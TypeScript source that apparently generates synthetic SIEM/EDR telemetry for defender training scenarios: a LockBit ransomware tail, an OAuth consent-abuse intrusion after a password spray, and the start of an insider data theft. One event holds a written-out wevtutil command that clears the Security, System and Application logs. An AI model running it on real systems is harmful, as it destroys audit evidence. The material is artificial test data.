        cmdline: "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
        user: sys, integrity: "system",
      },
      description: "wevtutil.exe cleared the Security, System, and Application event logs on FS-CORP-01 right after the shadow copies were deleted.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "host.ip": server.ip,
      },
    },
    winServer("evt_08b_audit_clear", T(121 * MIN + 5_000), "windows_security", server.hostname, undefined, "audit_log_cleared", "high",
      "Windows recorded Event 1102 on FS-CORP-01 - the Security audit log was cleared.", {
        "event.code": "1102", "winlog.event_id": "1102", "host.ip": server.ip,
        "winlog.event_data.SubjectUserName": "FS-CORP-01$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectLogonId": "0x3e7",
      }, "T1685.005"),

    // ── The ransomware payload runs under PsExec's SYSTEM session ─────────────────
    falconProc("evt_09a_payload_start", T(122 * MIN + 50 * SEC), server, lockP,
      { severity: "critical", mitre: "T1486", description: "PSEXESVC.exe started wu_update.exe (the file certutil.exe wrote to C:\\Windows\\Temp) as SYSTEM on FS-CORP-01." }),
    falconAlert("evt_09_ransom_exec", T(123 * MIN), server, lockP, {
      severity: "critical", mitre: "T1486", detect: "RansomwareFileEncryptionBehavior", tactic: "Impact", tacticId: "TA0040",
      technique: "Data Encrypted for Impact", techId: "T1486", file: { path: payloadPath, sha256: rswHash },
      description: "CrowdStrike flagged wu_update.exe (LockBit 3.0) running as SYSTEM on FS-CORP-01 but did not block it - the server policy is set to detection-only.",
    }),
    ...encFiles.map((f, i) => share(i + 1, f)),
    {
      id: "evt_10_encryption", ts: T(124 * MIN + 45 * SEC),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ueba_anomaly",
      hostname: server.hostname, src_ip: server.ip,
      severity: "high", mitre_technique: "T1486", is_detection: true,
      description: "2,847 files (18GB) across the Finance, HR, and Contracts shares on FS-CORP-01 were renamed with one new extension in about 100 seconds.",
      raw: {
        "AlertName": "Mass file rename with a new extension on a file server",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "2b7d9c14-6e03-4a58-9f21-c84e5a0b3d77_9e1a4f68-0c2b-4d37-8a95-b6f3d2e7c001",
        "Status": "New",
        "Tactics": "Impact",
        "Techniques": "[\"T1486\"]",
        "CompromisedEntity": "FS-CORP-01",
        "ExtendedProperties.Query Period": "00:05:00",
        "ExtendedProperties.Number of events": 2847,
        "ExtendedProperties.Event ID": "11",
        "ExtendedProperties.New file extension": encExt,
        "ExtendedProperties.Total size": "18 GB",
        "ExtendedProperties.Shares": "Finance, HR, Contracts",
        "Entities": JSON.stringify([
          { $id: "2", HostName: "FS-CORP-01", DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Name: "wu_update.exe", Type: "file" },
        ]),
      },
    },
    {
      id: "evt_11_ransom_note", ts: T(125 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: server.hostname, src_ip: server.ip,
      severity: "high", mitre_technique: "T1486",
      file: { path: "C:\\Shares\\Finance\\Restore-My-Files.txt", sha256: noteHash },
      process: lockP,
      description: "Restore-My-Files.txt was dropped into 14 shared folders on FS-CORP-01, demanding 0.25 BTC within 72 hours via a dark web payment link.",
      raw: {
        "crowdstrike.event_simpleName": "GenericFileWritten",
        "file.path": "C:\\Shares\\Finance\\Restore-My-Files.txt",
        "file.name": "Restore-My-Files.txt",
        "file.hash.sha256": noteHash,
        "host.name": "FS-CORP-01", "host.ip": server.ip,
      },
    },
  ];
  // A remote logon's row carries the peer the record's IpAddress shows (the helpdesk console / the patient-zero workstation).
  events.forEach(e => {
    if (e.id === "evt_00_da_session") e.src_ip = "10.10.5.22";
    if (e.id === "evt_05b_fs_logon") e.src_ip = zero.ip;
  });
  // Baseline rows sit where the clock puts them; every other row is already in story order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Critical file server alert and an unreachable Finance share", events, T, MIN, zero, server, c2Ip, c2Dom, rswHash, psxHash, docmHash, senderIp };
}

/** Telemetry half of `buildOAuthScenario`: the events and the story title, no answer key. */
export function oauthScenarioEvents() {
  const B = new Date("2026-05-06T02:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HR  = 60 * MIN;
  const SEC = 1_000;

  const victim     = { hostname: "MBP-SCHEN-01", email: "s.chen@nexacorp.com",  ip: "10.10.50.18" };
  // Story-specific hosting-provider infrastructure (not shared with phishing / bec).
  const sprayIp    = "152.89.196.22";
  const sessionIp  = "193.233.20.57";
  // The application's id as the tenant's own records print it (the app registration, the consent
  // and every token the app is issued all carry this one id).
  const appId      = "24502ac4-7a64-456b-af01-2f4f281e8608";
  const spId       = "9972c140-7a9c-440f-a59a-c898b5ff33cf";
  const tenant     = "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b";
  const egress     = "217.177.80.10";
  const appName    = "MicrosoftSecurityUpdate";
  const winUa      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
  const macUa      = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15";
  const pyUa       = "python-requests/2.31.0";
  const guid = (n: number) => `a1b2c3d4-e5f6-4a1b-b2c3-${n.toString(16).padStart(12, "0")}`;
  const sess = { attacker: "9c41f6e2-1b7a-4d35-8e08-3a5c7d9b2f10", tok1: "ab1e3c55-6a07-4f99-b3d2-4e8f1c0a7d21", tok2: "c7d20e84-35bb-4a61-9f0c-81a2b6e4d3f9", tok3: "d3f81a09-7c2e-4b5d-a6e1-0f94c2b7e5a8" };

  // ── Entra sign-ins ───────────────────────────────────────────────────────────
  const entra = (o: {
    id: string; ts: string; email: string; display: string; ip: string; code: string; city: string; iso: string; ua: string; browser: string; os: string;
    type: TelemetryEvent["event_type"]; severity: TelemetryEvent["severity"]; corr: string; risk: "high" | "medium" | "none";
    desc: string; mitre?: string; mfa?: boolean; managed?: boolean; session?: string; interactive?: boolean; app?: string; resource?: string; token?: string;
  }): TelemetryEvent => ({
    id: o.id, ts: o.ts,
    source: "o365", vendor: "Microsoft Entra ID", event_type: o.type,
    user_email: o.email, src_ip: o.ip,
    severity: o.severity, mitre_technique: o.mitre,
    network: { user_agent: o.ua },
    description: o.desc,
    raw: {
      "azure.signinlogs.correlation_id": o.corr,
      "azure.signinlogs.resultType": o.code,
      ...(o.code === "0" ? { "azure.signinlogs.result_description": "Successfully signed in" } : {}),
      "azure.signinlogs.app_display_name": o.app ?? "Microsoft 365",
      ...(o.resource ? { "azure.signinlogs.resource_display_name": o.resource } : {}),
      "azure.signinlogs.client_app_used": o.interactive === false ? "Mobile Apps and Desktop clients" : "Browser",
      "azure.signinlogs.authentication_requirement": o.mfa === false ? "singleFactorAuthentication" : "multiFactorAuthentication",
      "azure.signinlogs.conditional_access_status": o.code === "0" ? (o.managed ? "success" : "notApplied") : o.code === "500121" ? "failure" : "notApplied",
      "azure.signinlogs.risk_level_aggregated": o.risk,
      "azure.signinlogs.risk_level_during_signin": o.risk,
      ...(o.risk !== "none" ? { "azure.signinlogs.risk_event_types_v2": "unfamiliarFeatures", "azure.signinlogs.risk_state": "atRisk" } : {}),
      "azure.signinlogs.is_interactive": String(o.interactive !== false),
      "azure.signinlogs.tenant_id": tenant,
      "azure.signinlogs.user_principal_name": o.email,
      "azure.signinlogs.user_display_name": o.display,
      "azure.signinlogs.user_type": "Member",
      ...(o.session ? { "azure.signinlogs.properties.sessionId": o.session } : {}),
      ...(o.token ? { "azure.signinlogs.properties.incomingTokenType": o.token } : {}),
      "azure.signinlogs.device_detail.browser": o.browser,
      "azure.signinlogs.device_detail.operating_system": o.os,
      "azure.signinlogs.device_detail.is_compliant": String(!!o.managed),
      "azure.signinlogs.device_detail.is_managed": String(!!o.managed),
      "azure.signinlogs.location.city": o.city,
      "azure.signinlogs.location.country_or_region": o.iso,
      "source.ip": o.ip,
    },
  });
  const chen = { email: victim.email, display: "Sarah Chen" };
  const attacker = (id: string, ts: string, who: { email: string; display: string }, code: string, corr: number, desc: string, x: Partial<Parameters<typeof entra>[0]> = {}) =>
    entra({ id, ts, ...who, ip: sprayIp, code, city: "Frankfurt", iso: "DE", ua: winUa, browser: "Chrome 124.0.0", os: "Windows10",
      type: code === "0" ? "auth_success" : code === "500121" ? "mfa_denied" : "auth_failure", severity: "medium", corr: guid(corr), risk: "medium", desc, mfa: false, ...x });

  // The spray: two rounds against ten accounts at a pace that stays under Entra smart lockout.
  const roster = ["s.chen", "o.berman", "t.nakamura", "g.rossi", "h.weiss", "k.adeyemi", "l.fontaine", "d.petrov", "m.silva", "a.cohen"];
  const display = (u: string) => u.split(".").map(p => p[0].toUpperCase() + p.slice(1)).join(" ").replace(/^(\w) /, "$1 ");
  const round2 = ["s.chen", "o.berman", "t.nakamura", "g.rossi", "h.weiss", "k.adeyemi", "l.fontaine"];
  const spray: TelemetryEvent[] = [
    ...roster.map((u, i) => attacker(i === 0 ? "evt_01_spray" : `evt_01_spray_${String(i + 1).padStart(2, "0")}`, T(i * 10 * SEC), { email: `${u}@nexacorp.com`, display: u === "s.chen" ? "Sarah Chen" : display(u) },
      "50126", 0x100 + i, `Entra ID recorded a failed sign-in (50126, invalid password) for ${u} from ${sprayIp} (Frankfurt).`,
      i === 0 ? { severity: "high", mitre: "T1110.003" } : {})),
    ...round2.map((u, i) => u === "s.chen"
      // Her password is among the guesses: Entra accepts it and asks for the second factor.
      ? attacker("evt_01_spray_pw", T(3 * MIN + i * 10 * SEC), chen, "50074", 0x1f0, `s.chen's password was accepted from ${sprayIp} and Entra asked for MFA.`, { severity: "high" })
      : attacker(`evt_01_spray_r2_${String(i).padStart(2, "0")}`, T(3 * MIN + i * 10 * SEC), { email: `${u}@nexacorp.com`, display: display(u) },
        "50126", 0x200 + i, `Entra ID recorded a second failed sign-in (50126) for ${u} from ${sprayIp}.`)),
  ];

  // ── The application's own tokens ─────────────────────────────────────────────
  // Delegated access: the app redeems its refresh token for s.chen. Entra logs each redemption as a
  // non-interactive user sign-in; no password or prompt is involved.
  const tokenRow = (id: string, ts: string, n: number, session: string, desc: string, mitre?: string): TelemetryEvent =>
    entra({ id, ts, ...chen, ip: sessionIp, code: "0", city: "Ashburn", iso: "US", ua: pyUa, browser: "Python Requests 2.31", os: "", type: "auth_success", severity: "medium",
      corr: guid(0x300 + n), risk: "none", interactive: false, app: appName, resource: "Microsoft Graph", session, token: "refreshToken", desc, mitre });
  // The UAL's token context ties every app read to the redemption that issued its token.
  const appCtx = (session: string, issued: string) => ({
    "data.office365.AppAccessContext.AADSessionId": session,
    "data.office365.AppAccessContext.IssuedAtTime": issued,
    "application.id": appId, "application.name": appName,
  });
  const fileRow = (n: number, ts: string, name: string, folder: string, size: number, label: string): TelemetryEvent => ({
    id: `evt_09_onedrive_dl_${String(n).padStart(2, "0")}`, ts,
    source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
    user_email: victim.email, src_ip: sessionIp,
    severity: n === 1 ? "critical" : "high", mitre_technique: n === 1 ? "T1530" : undefined,
    file: { name, path: `https://nexacorp-my.sharepoint.com/personal/s_chen_nexacorp_com/Documents/${encodeURIComponent(folder)}/${encodeURIComponent(name)}`, size },
    network: { bytes_out: size },
    description: `The ${appName} app downloaded ${name} (${label}) from s.chen's OneDrive via Microsoft Graph.`,
    raw: {
      "data.office365.Operation": "FileDownloaded",
      "data.office365.Workload": "OneDrive",
      "data.office365.UserId": victim.email,
      "data.office365.ClientIP": sessionIp,
      "data.office365.SiteUrl": "https://nexacorp-my.sharepoint.com/personal/s_chen_nexacorp_com/",
      "data.office365.SourceRelativeUrl": `Documents/${folder}`,
      "data.office365.UserAgent": pyUa,
      "data.office365.IsManagedDevice": "false",
      ...appCtx(sess.tok3, "2026-05-06T14:50:09"),
    },
  });
  const downloads: [string, string, string, number, string][] = [
    ["14:52:10", "Q3-Compensation-Review.xlsx", "HR Planning", 3_820_000, "Confidential"],
    ["14:52:48", "Headcount-Plan-FY27.xlsx", "HR Planning", 2_940_000, "Confidential"],
    ["14:53:31", "Product-Roadmap-2027.pptx", "Product Strategy", 41_300_000, "Restricted"],
    ["14:54:20", "Pricing-Model-v9.xlsx", "Product Strategy", 6_120_000, "Confidential"],
    ["14:55:12", "Architecture-Review-Notes.docx", "Engineering", 1_780_000, "Internal"],
    ["14:55:59", "Customer-Contracts-Summary.xlsx", "Legal", 8_450_000, "Confidential"],
    ["14:56:40", "M&A-Target-List.xlsx", "Corporate Development", 2_210_000, "Restricted"],
    ["14:57:26", "Board-Update-June.pdf", "Corporate Development", 14_600_000, "Restricted"],
    ["14:58:10", "Patent-Draft-Disclosure.docx", "Legal", 5_330_000, "Confidential"],
    ["14:58:57", "Vendor-Pricing-Comparison.xlsx", "Procurement", 4_070_000, "Internal"],
    ["14:59:44", "Security-Audit-2026.pdf", "Engineering", 18_900_000, "Confidential"],
  ];

  const events: TelemetryEvent[] = [
    ...spray,
    attacker("evt_02_mfa_prompt_1", T(7 * MIN), chen, "500121", 0x401, "s.chen did not complete the first MFA prompt from the Frankfurt address.", { mfa: true }),
    attacker("evt_02_mfa_prompt_2", T(8 * MIN + 30 * SEC), chen, "500121", 0x402, "s.chen did not complete the second MFA prompt from the Frankfurt address.", { mfa: true }),
    attacker("evt_02_mfa_accept", T(10 * MIN), chen, "0", 0x403, `s.chen completed MFA from Frankfurt, Germany (${sprayIp}) on an unmanaged Windows device.`,
      { severity: "critical", mitre: "T1078", risk: "high", mfa: true, session: sess.attacker }),
    {
      id: "evt_03_app_register", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1098.001",
      network: { user_agent: winUa },
      description: `An app named ${appName} was registered in s.chen's tenant from ${sprayIp}, with a reply URL on microsoftupdate-secure.xyz.`,
      raw: {
        // Entra ID Audit Log - Add application
        "data.office365.Operation": "Add application",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        "azure.auditlogs.operationName": "Add application",
        "azure.auditlogs.category": "ApplicationManagement",
        "azure.auditlogs.correlation_id": guid(0x501),
        "azure.auditlogs.target_resources.id": appId,
        "azure.auditlogs.target_resources.display_name": appName,
        "azure.auditlogs.target_resources.type": "Application",
        "oauth.app.id": appId,
        "oauth.app.name": appName,
        "oauth.app.redirect_uris": "https://microsoftupdate-secure.xyz/auth/callback",
        "application.id": appId,
        "application.name": appName,
        "source.ip": sprayIp,
      },
    },
    {
      id: "evt_03b_service_principal", ts: T(15 * MIN + 30 * SEC),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "high", mitre_technique: "T1098.001",
      description: `A service principal for ${appName} was created in the tenant by s.chen's session.`,
      raw: {
        "data.office365.Operation": "Add service principal",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ObjectId": `ServicePrincipal_${spId}`,
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        "application.id": appId,
        "application.name": appName,
      },
    },
    {
      id: "evt_03c_app_secret", ts: T(15 * MIN + 50 * SEC),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "high", mitre_technique: "T1098.001",
      network: { user_agent: winUa },
      description: `A client secret was added to ${appName} by s.chen's session.`,
      raw: {
        "data.office365.Operation": "Add service principal credentials",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ObjectId": appId,
        "data.office365.ModifiedProperties": "[KeyIdentifier=5e1d3b7a-92c4-4f08-a6d1-7b0c9e2f4a13,KeyType=Password,KeyUsage=Verify,DisplayName=graph-sync]",
        "data.office365.ClientIP": sprayIp,
        "azure.auditlogs.target_resources.display_name": appName,
        "azure.auditlogs.target_resources.id": spId,
        "azure.auditlogs.correlation_id": guid(0x502),
        "source.ip": sprayIp,
      },
    },
    {
      id: "evt_04_consent", ts: T(16 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1528",
      network: { user_agent: winUa },
      description: "s.chen granted the MicrosoftSecurityUpdate app consent to Mail.ReadWrite, Files.ReadWrite.All and User.ReadBasic.All. The consent was recorded from the Frankfurt address.",
      raw: {
        // Entra ID Audit Log - Consent to application
        "data.office365.Operation": "Consent to application",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        "azure.auditlogs.category": "ApplicationManagement",
        "azure.auditlogs.correlation_id": guid(0x503),
        // Self-consent: the only kind an ordinary user can grant (tenant_wide false).
        "oauth.consent.type": "Principal",
        "oauth.consent.scopes_granted": "Mail.ReadWrite|Files.ReadWrite.All|User.ReadBasic.All",
        "oauth.consent.principal_type": "User",
        "oauth.consent.is_admin_consent": "false",
        "oauth.consent.tenant_wide": "false",
        "application.id": appId,
        "application.name": appName,
        "source.ip": sprayIp,
      },
    },
    {
      id: "evt_04b_permission_grant", ts: T(16 * MIN + 1_000),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "high", mitre_technique: "T1528",
      description: `A delegated permission grant for ${appName} was created for s.chen.`,
      raw: {
        "data.office365.Operation": "Add OAuth2PermissionGrant",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@nexacorp.com",
        "data.office365.ObjectId": `ServicePrincipal_${spId}`,
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        "application.id": appId,
        "application.name": appName,
      },
    },

    // ── CORRELATED: first mailbox access through the app, right after consent ──────────
    {
      id: "evt_oauth_immediate_mailbox", ts: T(17 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: sprayIp,
      mitre_technique: "T1114.002",
      description: `The ${appName} app read items in s.chen's mailbox via Graph API one minute after consent was granted.`,
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIP": sprayIp,
        "data.office365.UserId": victim.email,
        "data.office365.MailboxOwnerUPN": victim.email,
        "data.office365.OperationProperties.MailAccessType": "Bind",
        "data.office365.OperationCount": "6",
        "data.office365.Folders.Path": "\\Inbox",
        ...appCtx(sess.attacker, "2026-05-06T02:46:40"),
        "mail.folder_accessed": "Inbox",
        "source.ip": sprayIp,
      },
    },
    tokenRow("evt_04c_token_1", T(1 * HR + 8 * MIN), 1, sess.tok1, `${appName} was issued a Microsoft Graph token for s.chen from ${sessionIp} without a password or MFA prompt.`),
    {
      id: "evt_05_graph_mail_1", ts: T(1 * HR + 15 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `The ${appName} app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp}.`,
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.MailboxOwnerUPN": victim.email,
        "data.office365.ClientIP": sessionIp,
        "data.office365.OperationProperties.MailAccessType": "Sync",
        "data.office365.OperationCount": "187",
        "data.office365.Folders.Path": "\\Inbox",
        ...appCtx(sess.tok1, "2026-05-06T03:38:05"),
        "mail.folder": "Inbox",
        "source.ip": sessionIp,
      },
    },
    // ── The help desk's side of the story: the ticket, then the reset ──────────────────────
    {
      id: "evt_06a_ticket_opened", ts: T(6 * HR + 35 * MIN),
      source: "soar", vendor: "ServiceNow ITSM", event_type: "policy_modification",
      user_email: victim.email, severity: "informational",
      description: "s.chen reported a sign-in approval she did not start; incident INC0004821 was opened.",
      raw: {
        "servicenow.table": "incident",
        "servicenow.number": "INC0004821",
        "servicenow.state": "In Progress",
        "servicenow.short_description": "Sign-in report: Authenticator approval request I did not start",
        "servicenow.caller_id": "s.chen@nexacorp.com",
        "servicenow.opened_by": "s.chen@nexacorp.com",
        "servicenow.opened_at": "2026-05-06 09:05:00",
        "servicenow.assigned_to": "it-helpdesk@nexacorp.com",
        "servicenow.contact_type": "self-service",
        "servicenow.category": "security",
        "servicenow.impact": "2 - Medium",
        "servicenow.urgency": "2 - Medium",
        "servicenow.assignment_group": "Service Desk",
        "servicenow.work_notes": "Caller saw an Authenticator approval request around 02:40 that she did not start. Plan: reset the password.",
      },
    },
    {
      id: "evt_06_pw_reset", ts: T(7 * HR),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: "it-helpdesk@nexacorp.com", src_ip: egress,
      severity: "medium",
      description: "IT helpdesk reset s.chen's password (ticket INC0004821) after a suspicious sign-in report.",
      raw: {
        // Entra ID Audit Log - Reset user password (helpdesk action on s.chen)
        "data.office365.Operation": "Reset user password",
        "data.office365.UserId": "it-helpdesk@nexacorp.com",
        "data.office365.ObjectId": "s.chen@nexacorp.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": egress,
        "azure.auditlogs.category": "UserManagement",
        "azure.auditlogs.properties.initiatedBy.user.userPrincipalName": "it-helpdesk@nexacorp.com",
        "azure.auditlogs.properties.initiatedBy.user.ipAddress": egress,
        "azure.auditlogs.properties.targetResources[0].userPrincipalName": "s.chen@nexacorp.com",
        "azure.auditlogs.properties.correlationId": guid(0x601),
        "target.user.email": "s.chen@nexacorp.com",
        "source.ip": egress,
      },
    },
    {
      id: "evt_06b_ticket_resolved", ts: T(7 * HR + 5 * MIN),
      source: "soar", vendor: "ServiceNow ITSM", event_type: "policy_modification",
      user_email: victim.email, severity: "informational",
      description: "Incident INC0004821 was resolved after the password reset.",
      raw: {
        "servicenow.table": "incident",
        "servicenow.number": "INC0004821",
        "servicenow.state": "Resolved",
        "servicenow.short_description": "Sign-in report: Authenticator approval request I did not start",
        "servicenow.caller_id": "s.chen@nexacorp.com",
        "servicenow.opened_by": "s.chen@nexacorp.com",
        "servicenow.opened_at": "2026-05-06 09:05:00",
        "servicenow.assigned_to": "it-helpdesk@nexacorp.com",
        "servicenow.contact_type": "self-service",
        "servicenow.category": "security",
        "servicenow.impact": "2 - Medium",
        "servicenow.urgency": "2 - Medium",
        "servicenow.assignment_group": "Service Desk",
        "servicenow.resolved_by": "it-helpdesk@nexacorp.com",
        "servicenow.resolved_at": "2026-05-06 09:35:00",
        "servicenow.close_code": "Solved (Permanently)",
        "servicenow.close_notes": "Password reset for s.chen and the user told to choose a new one. No other action taken.",
      },
    },
    tokenRow("evt_07a_token_2", T(9 * HR + 21 * MIN), 2, sess.tok2, `${appName} was issued another Microsoft Graph token for s.chen from ${sessionIp}, 2 hours after the password reset and the ticket closing.`, "T1550.001"),
    {
      id: "evt_07_graph_mail_2", ts: T(9 * HR + 30 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `The ${appName} app read 143 more emails from s.chen's inbox via Graph API, 2.5 hours after the password reset.`,
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.MailboxOwnerUPN": victim.email,
        "data.office365.ClientIP": sessionIp,
        "data.office365.OperationProperties.MailAccessType": "Sync",
        "data.office365.OperationCount": "143",
        "data.office365.Folders.Path": "\\Inbox",
        ...appCtx(sess.tok2, "2026-05-06T11:51:07"),
        "mail.folder": "Inbox",
        "source.ip": sessionIp,
      },
    },
    {
      id: "evt_08_sharepoint_dl", ts: T(11 * HR),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "critical", mitre_technique: "T1530",
      file: { name: "RoadmapQ4-Confidential.pptx", path: "https://nexacorp.sharepoint.com/sites/ProductEngineering/Shared%20Documents/Roadmap/RoadmapQ4-Confidential.pptx", size: 27_100_000 },
      description: `The ${appName} app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API.`,
      network: { bytes_out: 27_100_000 },
      raw: {
        "data.office365.Operation": "FileDownloaded",
        "data.office365.Workload": "SharePoint",
        "data.office365.UserId": victim.email,
        "data.office365.ClientIP": sessionIp,
        "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/ProductEngineering/",
        "data.office365.SourceRelativeUrl": "Shared Documents/Roadmap",
        "data.office365.UserAgent": pyUa,
        "data.office365.IsManagedDevice": "false",
        ...appCtx(sess.tok2, "2026-05-06T11:51:07"),
        "source.ip": sessionIp,
      },
    },
    tokenRow("evt_09a_token_3", T(12 * HR + 20 * MIN), 3, sess.tok3, `${appName} was issued a third Microsoft Graph token for s.chen from ${sessionIp}.`),
    ...downloads.map(([hms, name, folder, size, label], i) => fileRow(i + 1, new Date(`2026-05-06T${hms}Z`).toISOString(), name, folder, size, label)),
    {
      // The SIEM's scheduled analytic over the Graph activity log and the audit log.
      id: "evt_10_app_still_active", ts: T(16 * HR),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ueba_anomaly",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", is_detection: true,
      description: "A Sentinel analytics rule reported unusual Microsoft Graph activity by the MicrosoftSecurityUpdate app for s.chen, with 330 mail items and 89 files accessed since consent.",
      raw: {
        "AlertName": "Anomalous Microsoft Graph access by a non-interactive application",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "7c3e1a90-4d82-4b65-a0f7-5e29b8d1c364_3f0b6e21-9a47-4c8d-b152-d7e8a09c4f15",
        "Status": "New",
        "Tactics": "Collection",
        "Techniques": "[\"T1114\",\"T1530\"]",
        "CompromisedEntity": "s.chen@nexacorp.com",
        "ExtendedProperties.Application": appName,
        "ExtendedProperties.Application Id": appId,
        "ExtendedProperties.Client IP Address": sessionIp,
        "ExtendedProperties.Mail Items Accessed": 330,
        "ExtendedProperties.Files Downloaded": 89,
        "ExtendedProperties.Data Downloaded": "340 MB",
        "ExtendedProperties.First Seen": T(16 * MIN),
        "Entities": JSON.stringify([
          { $id: "2", Name: "s.chen", UPNSuffix: "nexacorp.com", Type: "account" },
          { $id: "3", Address: sessionIp, Type: "ip" },
          { $id: "4", Name: appName, AppId: appId, Type: "cloud-application" },
        ]),
      },
    },

    // ── Baseline - s.chen on a normal working day: her usual city, her managed MacBook ─────
    entra({
      id: "evt_oauth_baseline", ts: "2026-05-05T08:58:30.000Z", ...chen, ip: victim.ip, code: "0", city: "London", iso: "GB", ua: macUa, browser: "Safari 17.4", os: "MacOs",
      type: "auth_success", severity: "informational", corr: guid(0x700), risk: "none", managed: true, mfa: true,
      desc: "s.chen signed in to Microsoft 365 from the office network on her managed MacBook.",
    }),
  ];
  events.forEach(e => { if (e.id === "evt_oauth_baseline") e.is_baseline = true; });
  // Baseline rows sit where the clock puts them; every other row is already in story order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Graph activity alert after a password reset", events, T, MIN, HR, victim, sprayIp, sessionIp };
}

/** Telemetry half of `buildInsiderThreatScenario`: the events and the story title, no answer key. */
export function insiderThreatScenarioEvents() {
  const B = new Date("2026-05-06T13:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const insider = { hostname: "WS-FIN-4421", email: "m.torres@nexacorp.com", ip: "10.10.20.91" };
  // USB mass-storage serial as Windows' PnP device id carries it (SanDisk Ultra, VID_0781).
  const usbSerial = "4C530001240506115330";
  const zipHash = makeSha256("finance_backup_zip_insider_staging");
  const zscalerNode = "165.225.38.11";   // the ZIA gateway the Client Connector tunnels to
  const gcsIp = "142.250.185.74";        // www.googleapis.com as the proxy resolved it
  const spoIp = "13.107.138.8";          // nexacorp.sharepoint.com

  // The 8 sensitive workbooks the user pulled from SharePoint, saved in Downloads, copied to the USB drive
  // and (in a compressed folder) pushed at a personal bucket. Sizes are the on-disk bytes of each workbook.
  const files = [
    { name: "Headcount_Reduction_Plan_Nov26.xlsx", size: 1_186_304, site: "HR",      dlAt: 7 * MIN,  usbAt: 6 * SEC },
    { name: "Q2-Vendor-Payments.xlsx",             size: 1_031_255, site: "Finance", dlAt: 10 * MIN, usbAt: 11 * SEC },
    { name: "Employee_Salary_Master_2026.xlsx",    size: 2_412_876, site: "Finance", dlAt: 12 * MIN, usbAt: 5 * SEC },
    { name: "Bonus_Targets_2026.xlsx",             size: 842_517,   site: "Finance", dlAt: 14 * MIN, usbAt: 7 * SEC },
    { name: "Payroll_2026_Q1.xlsx",                size: 2_734_112, site: "Finance", dlAt: 16 * MIN, usbAt: 8 * SEC },
    { name: "Salary_Bands_2026.xlsx",              size: 665_980,   site: "Finance", dlAt: 18 * MIN, usbAt: 9 * SEC },
    { name: "Commission_Plan_2026.xlsx",           size: 929_671,   site: "Finance", dlAt: 20 * MIN, usbAt: 10 * SEC },
